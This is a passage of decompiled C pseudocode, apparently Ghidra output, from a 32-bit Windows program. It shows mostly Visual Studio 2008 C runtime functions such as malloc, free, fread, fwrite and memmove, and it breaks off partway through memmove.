undefined4 * __fastcall FUN_0040fb39(undefined4 *param_1)

{
  int iVar1;
  
  FUN_0040fab6((int)param_1);
  *param_1 = 0x38;
  param_1[2] = 0x400000;
  param_1[1] = 0x400000;
  param_1[3] = 0x900;
  param_1[4] = &DAT_00424e44;
  iVar1 = FUN_0040fa3f((LPCRITICAL_SECTION)(param_1 + 5));
  if (iVar1 < 0) {
    DAT_0046eb18 = 1;
  }
  return param_1;
}



void FUN_0040fb79(void *param_1)

{
  _free(param_1);
  return;
}



// Library Function - Single Match
//  @__security_check_cookie@4
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __fastcall ___security_check_cookie_4(int param_1)

{
  if (param_1 == DAT_0042b0a0) {
    return;
  }
                    // WARNING: Subroutine does not return
  ___report_gsfailure();
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _V6_HeapAlloc
// 
// Library: Visual Studio 2008 Release

int * __cdecl _V6_HeapAlloc(uint *param_1)

{
  int *local_20;
  
  local_20 = (int *)0x0;
  if (param_1 <= DAT_0046ec50) {
    __lock(4);
    local_20 = ___sbh_alloc_block(param_1);
    FUN_0040fbd9();
  }
  return local_20;
}



void FUN_0040fbd9(void)

{
  FUN_00412cbf(4);
  return;
}



// Library Function - Single Match
//  _malloc
// 
// Library: Visual Studio 2008 Release

void * __cdecl _malloc(size_t _Size)

{
  int *piVar1;
  int iVar2;
  size_t sVar3;
  uint dwBytes;
  
  if (_Size < 0xffffffe1) {
    do {
      if (DAT_0042d55c == (HANDLE)0x0) {
        __FF_MSGBANNER();
        __NMSG_WRITE(0x1e);
        ___crtExitProcess(0xff);
      }
      if (DAT_0046ec44 == 1) {
        dwBytes = _Size;
        if (_Size == 0) {
          dwBytes = 1;
        }
LAB_0040fc51:
        piVar1 = (int *)HeapAlloc(DAT_0042d55c,0,dwBytes);
      }
      else if ((DAT_0046ec44 != 3) || (piVar1 = _V6_HeapAlloc((uint *)_Size), piVar1 == (int *)0x0))
      {
        sVar3 = _Size;
        if (_Size == 0) {
          sVar3 = 1;
        }
        dwBytes = sVar3 + 0xf & 0xfffffff0;
        goto LAB_0040fc51;
      }
      if (piVar1 != (int *)0x0) {
        return piVar1;
      }
      if (DAT_0042d878 == 0) {
        piVar1 = __errno();
        *piVar1 = 0xc;
        break;
      }
      iVar2 = __callnewh(_Size);
    } while (iVar2 != 0);
    piVar1 = __errno();
    *piVar1 = 0xc;
  }
  else {
    __callnewh(_Size);
    piVar1 = __errno();
    *piVar1 = 0xc;
  }
  return (void *)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _free
// 
// Library: Visual Studio 2008 Release

void __cdecl _free(void *_Memory)

{
  uint *puVar1;
  BOOL BVar2;
  int *piVar3;
  DWORD DVar4;
  int iVar5;
  
  if (_Memory != (void *)0x0) {
    if (DAT_0046ec44 == 3) {
      __lock(4);
      puVar1 = (uint *)___sbh_find_block((int)_Memory);
      if (puVar1 != (uint *)0x0) {
        ___sbh_free_block(puVar1,(int)_Memory);
      }
      FUN_0040fd02();
      if (puVar1 != (uint *)0x0) {
        return;
      }
    }
    BVar2 = HeapFree(DAT_0042d55c,0,_Memory);
    if (BVar2 == 0) {
      piVar3 = __errno();
      DVar4 = GetLastError();
      iVar5 = __get_errno_from_oserr(DVar4);
      *piVar3 = iVar5;
    }
  }
  return;
}



void FUN_0040fd02(void)

{
  FUN_00412cbf(4);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __wfsopen
// 
// Library: Visual Studio 2008 Release

FILE * __cdecl __wfsopen(wchar_t *_Filename,wchar_t *_Mode,int _ShFlag)

{
  int *piVar1;
  FILE *pFVar2;
  undefined local_14 [8];
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_004290c0;
  uStack_c = 0x40fd46;
  if (((_Filename == (wchar_t *)0x0) || (_Mode == (wchar_t *)0x0)) || (*_Mode == L'\0')) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    pFVar2 = __getstream();
    if (pFVar2 == (FILE *)0x0) {
      piVar1 = __errno();
      *piVar1 = 0x18;
    }
    else {
      local_8 = (undefined *)0x0;
      if (*_Filename != L'\0') {
        pFVar2 = __wopenfile(_Filename,_Mode,_ShFlag,pFVar2);
        local_8 = (undefined *)0xfffffffe;
        FUN_0040fdf6();
        return pFVar2;
      }
      piVar1 = __errno();
      *piVar1 = 0x16;
      __local_unwind4(&DAT_0042b0a0,(int)local_14,0xfffffffe);
    }
  }
  return (FILE *)0x0;
}



void FUN_0040fdf6(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __wfopen_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __wfopen_s(FILE **_File,wchar_t *_Filename,wchar_t *_Mode)

{
  int *piVar1;
  FILE *pFVar2;
  int iVar3;
  
  if (_File == (FILE **)0x0) {
    piVar1 = __errno();
    iVar3 = 0x16;
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    pFVar2 = __wfsopen(_Filename,_Mode,0x80);
    *_File = pFVar2;
    if (pFVar2 == (FILE *)0x0) {
      piVar1 = __errno();
      iVar3 = *piVar1;
    }
    else {
      iVar3 = 0;
    }
  }
  return iVar3;
}



// Library Function - Single Match
//  __fwrite_nolock
// 
// Library: Visual Studio 2008 Release

size_t __cdecl __fwrite_nolock(void *_DstBuf,size_t _Size,size_t _Count,FILE *_File)

{
  int *piVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  uint _Size_00;
  uint uVar5;
  uint uVar6;
  char *_Buf;
  uint local_c;
  char *local_8;
  
  if ((_Size != 0) && (_Count != 0)) {
    if ((_File != (FILE *)0x0) &&
       ((_DstBuf != (void *)0x0 && (_Count <= (uint)(0xffffffff / (ulonglong)_Size))))) {
      uVar6 = _Size * _Count;
      uVar5 = uVar6;
      if ((_File->_flag & 0x10cU) == 0) {
        local_c = 0x1000;
      }
      else {
        local_c = _File->_bufsiz;
      }
      do {
        while( true ) {
          if (uVar5 == 0) {
            return _Count;
          }
          uVar4 = _File->_flag & 0x108;
          if (uVar4 == 0) break;
          uVar3 = _File->_cnt;
          if (uVar3 == 0) break;
          if ((int)uVar3 < 0) {
            _File->_flag = _File->_flag | 0x20;
            goto LAB_0040ffa0;
          }
          _Size_00 = uVar5;
          if (uVar3 <= uVar5) {
            _Size_00 = uVar3;
          }
          _memcpy(_File->_ptr,_DstBuf,_Size_00);
          _File->_cnt = _File->_cnt - _Size_00;
          _File->_ptr = _File->_ptr + _Size_00;
          uVar5 = uVar5 - _Size_00;
LAB_0040ff5c:
          local_8 = (char *)((int)_DstBuf + _Size_00);
          _DstBuf = local_8;
        }
        if (local_c <= uVar5) {
          if ((uVar4 != 0) && (iVar2 = __flush(_File), iVar2 != 0)) goto LAB_0040ffa0;
          uVar4 = uVar5;
          if (local_c != 0) {
            uVar4 = uVar5 - uVar5 % local_c;
          }
          _Buf = (char *)_DstBuf;
          uVar3 = uVar4;
          iVar2 = __fileno(_File);
          uVar3 = __write(iVar2,_Buf,uVar3);
          if (uVar3 != 0xffffffff) {
            _Size_00 = uVar4;
            if (uVar3 <= uVar4) {
              _Size_00 = uVar3;
            }
            uVar5 = uVar5 - _Size_00;
            if (uVar4 <= uVar3) goto LAB_0040ff5c;
          }
          _File->_flag = _File->_flag | 0x20;
LAB_0040ffa0:
          return (uVar6 - uVar5) / _Size;
        }
                    // WARNING: Load size is inaccurate
        iVar2 = __flsbuf((int)*_DstBuf,_File);
        if (iVar2 == -1) goto LAB_0040ffa0;
        _DstBuf = (void *)((int)_DstBuf + 1);
        local_c = _File->_bufsiz;
        uVar5 = uVar5 - 1;
        if ((int)local_c < 1) {
          local_c = 1;
        }
      } while( true );
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fwrite
// 
// Library: Visual Studio 2008 Release

size_t __cdecl _fwrite(void *_Str,size_t _Size,size_t _Count,FILE *_File)

{
  int *piVar1;
  size_t sVar2;
  
  if ((_Size != 0) && (_Count != 0)) {
    if (_File != (FILE *)0x0) {
      __lock_file(_File);
      sVar2 = __fwrite_nolock(_Str,_Size,_Count,_File);
      FUN_0041002d();
      return sVar2;
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return 0;
}



void FUN_0041002d(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 0x14));
  return;
}



// Library Function - Single Match
//  __fclose_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __fclose_nolock(FILE *_File)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  
  iVar3 = -1;
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar3 = -1;
  }
  else {
    if ((*(byte *)&_File->_flag & 0x83) != 0) {
      iVar3 = __flush(_File);
      __freebuf(_File);
      iVar2 = __fileno(_File);
      iVar2 = __close(iVar2);
      if (iVar2 < 0) {
        iVar3 = -1;
      }
      else if (_File->_tmpfname != (char *)0x0) {
        _free(_File->_tmpfname);
        _File->_tmpfname = (char *)0x0;
      }
    }
    _File->_flag = 0;
  }
  return iVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fclose
// 
// Library: Visual Studio 2008 Release

int __cdecl _fclose(FILE *_File)

{
  int *piVar1;
  int local_20;
  
  local_20 = -1;
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    local_20 = -1;
  }
  else if ((*(byte *)&_File->_flag & 0x40) == 0) {
    __lock_file(_File);
    local_20 = __fclose_nolock(_File);
    FUN_00410122();
  }
  else {
    _File->_flag = 0;
  }
  return local_20;
}



void FUN_00410122(void)

{
  FILE *unaff_ESI;
  
  __unlock_file(unaff_ESI);
  return;
}



// Library Function - Single Match
//  __onexit_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __onexit_nolock(int param_1)

{
  int *_Memory;
  int *piVar1;
  size_t sVar2;
  size_t sVar3;
  void *pvVar4;
  int iVar5;
  
  _Memory = (int *)__decode_pointer(DAT_0046fc8c);
  piVar1 = (int *)__decode_pointer(DAT_0046fc88);
  if ((piVar1 < _Memory) || (iVar5 = (int)piVar1 - (int)_Memory, iVar5 + 4U < 4)) {
    return 0;
  }
  sVar2 = __msize(_Memory);
  if (sVar2 < iVar5 + 4U) {
    sVar3 = 0x800;
    if (sVar2 < 0x800) {
      sVar3 = sVar2;
    }
    if ((sVar3 + sVar2 < sVar2) ||
       (pvVar4 = __realloc_crt(_Memory,sVar3 + sVar2), pvVar4 == (void *)0x0)) {
      if (sVar2 + 0x10 < sVar2) {
        return 0;
      }
      pvVar4 = __realloc_crt(_Memory,sVar2 + 0x10);
      if (pvVar4 == (void *)0x0) {
        return 0;
      }
    }
    piVar1 = (int *)((int)pvVar4 + (iVar5 >> 2) * 4);
    DAT_0046fc8c = __encode_pointer((int)pvVar4);
  }
  iVar5 = __encode_pointer(param_1);
  *piVar1 = iVar5;
  DAT_0046fc88 = __encode_pointer((int)(piVar1 + 1));
  return param_1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __onexit
// 
// Library: Visual Studio 2008 Release

_onexit_t __cdecl __onexit(_onexit_t _Func)

{
  _onexit_t p_Var1;
  
  FUN_0041207d();
  p_Var1 = (_onexit_t)__onexit_nolock((int)_Func);
  FUN_0041024b();
  return p_Var1;
}



void FUN_0041024b(void)

{
  FUN_00412086();
  return;
}



// Library Function - Single Match
//  _atexit
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl _atexit(_func_4879 *param_1)

{
  _onexit_t p_Var1;
  
  p_Var1 = __onexit((_onexit_t)param_1);
  return (p_Var1 != (_onexit_t)0x0) - 1;
}



// Library Function - Single Match
//  _wcscpy_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _wcscpy_s(wchar_t *_Dst,rsize_t _SizeInWords,wchar_t *_Src)

{
  wchar_t wVar1;
  int *piVar2;
  wchar_t *pwVar3;
  errno_t eVar4;
  
  if ((_Dst != (wchar_t *)0x0) && (_SizeInWords != 0)) {
    pwVar3 = _Dst;
    if (_Src != (wchar_t *)0x0) {
      do {
        wVar1 = *_Src;
        *pwVar3 = wVar1;
        _Src = _Src + 1;
        if (wVar1 == L'\0') break;
        _SizeInWords = _SizeInWords - 1;
        pwVar3 = pwVar3 + 1;
      } while (_SizeInWords != 0);
      if (_SizeInWords != 0) {
        return 0;
      }
      *_Dst = L'\0';
      piVar2 = __errno();
      eVar4 = 0x22;
      *piVar2 = 0x22;
      goto LAB_0041028a;
    }
    *_Dst = L'\0';
  }
  piVar2 = __errno();
  eVar4 = 0x16;
  *piVar2 = 0x16;
LAB_0041028a:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar4;
}



// Library Function - Single Match
//  _wcsstr
// 
// Library: Visual Studio 2008 Release

wchar_t * __cdecl _wcsstr(wchar_t *_Str,wchar_t *_SubStr)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  int iVar3;
  
  if (*_SubStr != L'\0') {
    wVar1 = *_Str;
    if (wVar1 != L'\0') {
      iVar3 = (int)_Str - (int)_SubStr;
      pwVar2 = _SubStr;
joined_r0x004102ff:
      do {
        if (wVar1 != L'\0') {
          if (*pwVar2 == L'\0') {
            return _Str;
          }
          if (*(wchar_t *)(iVar3 + (int)pwVar2) == *pwVar2) {
            wVar1 = *(wchar_t *)(iVar3 + (int)(pwVar2 + 1));
            pwVar2 = pwVar2 + 1;
            goto joined_r0x004102ff;
          }
        }
        if (*pwVar2 == L'\0') {
          return _Str;
        }
        _Str = _Str + 1;
        wVar1 = *_Str;
        iVar3 = iVar3 + 2;
        pwVar2 = _SubStr;
      } while (wVar1 != L'\0');
    }
    _Str = (wchar_t *)0x0;
  }
  return _Str;
}



void __cdecl FUN_00410338(wchar_t *param_1)

{
  _wcstol(param_1,(wchar_t **)0x0,10);
  return;
}



void __cdecl FUN_0041034e(wchar_t *param_1)

{
  FUN_00410338(param_1);
  return;
}



// Library Function - Single Match
//  _wcscat_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _wcscat_s(wchar_t *_Dst,rsize_t _SizeInWords,wchar_t *_Src)

{
  wchar_t wVar1;
  int *piVar2;
  wchar_t *pwVar3;
  errno_t eVar4;
  
  if ((_Dst != (wchar_t *)0x0) && (_SizeInWords != 0)) {
    pwVar3 = _Dst;
    if (_Src != (wchar_t *)0x0) {
      do {
        if (*pwVar3 == L'\0') break;
        pwVar3 = pwVar3 + 1;
        _SizeInWords = _SizeInWords - 1;
      } while (_SizeInWords != 0);
      if (_SizeInWords != 0) {
        do {
          wVar1 = *_Src;
          *pwVar3 = wVar1;
          pwVar3 = pwVar3 + 1;
          _Src = _Src + 1;
          if (wVar1 == L'\0') break;
          _SizeInWords = _SizeInWords - 1;
        } while (_SizeInWords != 0);
        if (_SizeInWords != 0) {
          return 0;
        }
        *_Dst = L'\0';
        piVar2 = __errno();
        eVar4 = 0x22;
        *piVar2 = 0x22;
        goto LAB_0041037b;
      }
    }
    *_Dst = L'\0';
  }
  piVar2 = __errno();
  eVar4 = 0x16;
  *piVar2 = 0x16;
LAB_0041037b:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar4;
}



// Library Function - Single Match
//  __fread_nolock_s
// 
// Library: Visual Studio 2008 Release

size_t __cdecl
__fread_nolock_s(void *_DstBuf,size_t _DstSize,size_t _ElementSize,size_t _Count,FILE *_File)

{
  uint uVar1;
  undefined *puVar2;
  int *piVar3;
  uint uVar4;
  int iVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  undefined *_DstBuf_00;
  uint local_10;
  
  if ((_ElementSize != 0) && (_Count != 0)) {
    if (_DstBuf != (void *)0x0) {
      if ((_File != (FILE *)0x0) && (_Count <= (uint)(0xffffffff / (ulonglong)_ElementSize))) {
LAB_00410451:
        uVar8 = _ElementSize * _Count;
        uVar7 = uVar8;
        puVar2 = (undefined *)_DstBuf;
        uVar1 = _DstSize;
        if ((_File->_flag & 0x10cU) == 0) {
          local_10 = 0x1000;
        }
        else {
          local_10 = _File->_bufsiz;
        }
joined_r0x00410477:
        do {
          while( true ) {
            if (uVar7 == 0) {
              return _Count;
            }
            if ((_File->_flag & 0x10cU) == 0) break;
            uVar4 = _File->_cnt;
            if (uVar4 == 0) break;
            if ((int)uVar4 < 0) {
LAB_004105c8:
              _File->_flag = _File->_flag | 0x20;
LAB_004105cc:
              return (uVar8 - uVar7) / _ElementSize;
            }
            uVar6 = uVar7;
            if (uVar4 <= uVar7) {
              uVar6 = uVar4;
            }
            if (uVar1 < uVar6) {
              if (_DstSize != 0xffffffff) {
                _memset(_DstBuf,0,_DstSize);
              }
              piVar3 = __errno();
              *piVar3 = 0x22;
              goto LAB_0041040d;
            }
            _memcpy_s(puVar2,uVar1,_File->_ptr,uVar6);
            _File->_cnt = _File->_cnt - uVar6;
            _File->_ptr = _File->_ptr + uVar6;
            uVar7 = uVar7 - uVar6;
            uVar1 = uVar1 - uVar6;
            puVar2 = puVar2 + uVar6;
          }
          if (local_10 <= uVar7) {
            if (local_10 == 0) {
              uVar4 = 0x7fffffff;
              if (uVar7 < 0x80000000) {
                uVar4 = uVar7;
              }
            }
            else {
              if (uVar7 < 0x80000000) {
                uVar6 = uVar7 % local_10;
                uVar4 = uVar7;
              }
              else {
                uVar6 = (uint)(0x7fffffff % (ulonglong)local_10);
                uVar4 = 0x7fffffff;
              }
              uVar4 = uVar4 - uVar6;
            }
            if (uVar1 < uVar4) {
LAB_0041059b:
              if (_DstSize != 0xffffffff) {
                _memset(_DstBuf,0,_DstSize);
              }
              piVar3 = __errno();
              *piVar3 = 0x22;
              goto LAB_0041040d;
            }
            _DstBuf_00 = puVar2;
            iVar5 = __fileno(_File);
            iVar5 = __read(iVar5,_DstBuf_00,uVar4);
            if (iVar5 == 0) {
              _File->_flag = _File->_flag | 0x10;
              goto LAB_004105cc;
            }
            if (iVar5 == -1) goto LAB_004105c8;
            uVar7 = uVar7 - iVar5;
            uVar1 = uVar1 - iVar5;
            puVar2 = puVar2 + iVar5;
            goto joined_r0x00410477;
          }
          iVar5 = __filbuf(_File);
          if (iVar5 == -1) goto LAB_004105cc;
          if (uVar1 == 0) goto LAB_0041059b;
          *puVar2 = (char)iVar5;
          local_10 = _File->_bufsiz;
          uVar7 = uVar7 - 1;
          uVar1 = uVar1 - 1;
          puVar2 = puVar2 + 1;
        } while( true );
      }
      if (_DstSize != 0xffffffff) {
        _memset(_DstBuf,0,_DstSize);
      }
      if ((_File != (FILE *)0x0) && (_Count <= (uint)(0xffffffff / (ulonglong)_ElementSize)))
      goto LAB_00410451;
    }
    piVar3 = __errno();
    *piVar3 = 0x16;
LAB_0041040d:
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fread_s
// 
// Library: Visual Studio 2008 Release

size_t __cdecl _fread_s(void *_DstBuf,size_t _DstSize,size_t _ElementSize,size_t _Count,FILE *_File)

{
  int *piVar1;
  size_t sVar2;
  
  if ((_ElementSize != 0) && (_Count != 0)) {
    if (_File != (FILE *)0x0) {
      __lock_file(_File);
      sVar2 = __fread_nolock_s(_DstBuf,_DstSize,_ElementSize,_Count,_File);
      FUN_0041066c();
      return sVar2;
    }
    if (_DstSize != 0xffffffff) {
      _memset(_DstBuf,0,_DstSize);
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return 0;
}



void FUN_0041066c(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 0x18));
  return;
}



// Library Function - Single Match
//  _fread
// 
// Library: Visual Studio 2008 Release

size_t __cdecl _fread(void *_DstBuf,size_t _ElementSize,size_t _Count,FILE *_File)

{
  size_t sVar1;
  
  sVar1 = _fread_s(_DstBuf,0xffffffff,_ElementSize,_Count,_File);
  return sVar1;
}



// Library Function - Single Match
//  _memmove
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

void * __cdecl _memmove(void *_Dst,void *_Src,size_t _Size)

{
  undefined4 *puVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  if ((_Src < _Dst) && (_Dst < (void *)(_Size + (int)_Src))) {
    puVar1 = (undefined4 *)((_Size - 4) + (int)_Src);
    puVar4 = (undefined4 *)((_Size - 4) + (int)_Dst);
    if (((uint)puVar4 & 3) == 0) {
      uVar2 = _Size >> 2;
      uVar3 = _Size & 3;
      if (7 < uVar2) {
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar4 = *puVar1;
          puVar1 = puVar1 + -1;
          puVar4 = puVar4 + -1;
        }
        switch(uVar3) {
        case 0:
          return _Dst;
        case 2:
          goto switchD_00410883_caseD_2;
        case 3:
          goto switchD_00410883_caseD_3;
        }
        goto switchD_00410883_caseD_1;
      }
    }
    else {
      switch(_Size) {
      case 0:
        goto switchD_00410883_caseD_0;
      case 1:
        goto switchD_00410883_caseD_1;
      case 2:
        goto switchD_00410883_caseD_2;
      case 3:
        goto switchD_00410883_caseD_3;
      default:
        uVar2 = _Size - ((uint)puVar4 & 3);
        switch((uint)puVar4 & 3) {
        case 1:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          puVar1 = (undefined4 *)((int)puVar1 + -1);
          uVar2 = uVar2 >> 2;
          puVar4 = (undefined4 *)((int)puVar4 - 1);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_00410883_caseD_2;
            case 3:
              goto switchD_00410883_caseD_3;
            }
            goto switchD_00410883_caseD_1;
          }
          break;
        case 2:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          puVar1 = (undefined4 *)((int)puVar1 + -2);
          puVar4 = (undefined4 *)((int)puVar4 - 2);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_00410883_caseD_2;
            case 3:
              goto switchD_00410883_caseD_3;
            }
            goto switchD_00410883_caseD_1;
          }
          break;
        case 3:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
          puVar1 = (undefined4 *)((int)puVar1 + -3);
          puVar4 = (undefined4 *)((int)puVar4 - 3);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_00410883_caseD_2;
            case 3:
              goto switchD_00410883_caseD_3;
            }
            goto switchD_00410883_caseD_1;
          }
        }
      }
    }
    switch(uVar2) {
    case 7:
      puVar4[7 - uVar2] = puVar1[7 - uVar2];
    case 6:
      puVar4[6 - uVar2] = puVar1[6 - uVar2];
    case 5:
      puVar4[5 - uVar2] = puVar1[5 - uVar2];
    case 4:
      puVar4[4 - uVar2] = puVar1[4 - uVar2];
    case 3:
      puVar4[3 - uVar2] = puVar1[3 - uVar2];
    case 2:
      puVar4[2 - uVar2] = puVar1[2 - uVar2];
    case 1:
      puVar4[1 - uVar2] = puVar1[1 - uVar2];
      puVar1 = puVar1 + -uVar2;
      puVar4 = puVar4 + -uVar2;
    }
    switch(uVar3) {
    case 1:
switchD_00410883_caseD_1:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      return _Dst;
    case 2:
switchD_00410883_caseD_2:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      return _Dst;
    case 3:
switchD_00410883_caseD_3:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
      return _Dst;
    }
switchD_00410883_caseD_0:
    return _Dst;
  }
  if (((0xff < _Size) && (DAT_0046ec40 != 0)) && (((uint)_Dst & 0xf) == ((uint)_Src & 0xf))) {
    puVar1 = __VEC_memcpy((undefined4 *)_Dst,(undefined4 *)_Src,_Size);
    return puVar1;
  }
  puVar1 = (undefined4 *)_Dst;
  if (((uint)_Dst & 3) == 0) {
    uVar2 = _Size >> 2;
    uVar3 = _Size & 3;
    if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar1 = *_Src;
        _Src = (undefined4 *)((int)_Src + 4);
        puVar1 = puVar1 + 1;
      }
      switch(uVar3) {
      case 0:
        return _Dst;
      case 2:
        goto switchD_004106fc_caseD_2;
      case 3:
        goto switchD_004106fc_caseD_3;
      }
      goto switchD_004106fc_caseD_1;
    }
  }
  else {
    switch(_Size) {
    case 0:
      goto switchD_004106fc_caseD_0;
    case 1:
      goto switchD_004106fc_caseD_1;
    case 2:
      goto switchD_004106fc_caseD_2;
    case 3:
      goto switchD_004106fc_caseD_3;
    default:
      uVar2 = (_Size - 4) + ((uint)_Dst & 3);
      switch((uint)_Dst & 3) {
      case 1:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 2) = *(undefined *)((int)_Src + 2);
        _Src = (void *)((int)_Src + 3);
        puVar1 = (undefined4 *)((int)_Dst + 3);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_004106fc_caseD_2;
          case 3:
            goto switchD_004106fc_caseD_3;
          }
          goto switchD_004106fc_caseD_1;
        }
        break;
      case 2:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        _Src = (void *)((int)_Src + 2);
        puVar1 = (undefined4 *)((int)_Dst + 2);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_004106fc_caseD_2;
          case 3:
            goto switchD_004106fc_caseD_3;
          }
          goto switchD_004106fc_caseD_1;
        }
        break;
      case 3:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        _Src = (void *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        puVar1 = (undefined4 *)((int)_Dst + 1);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
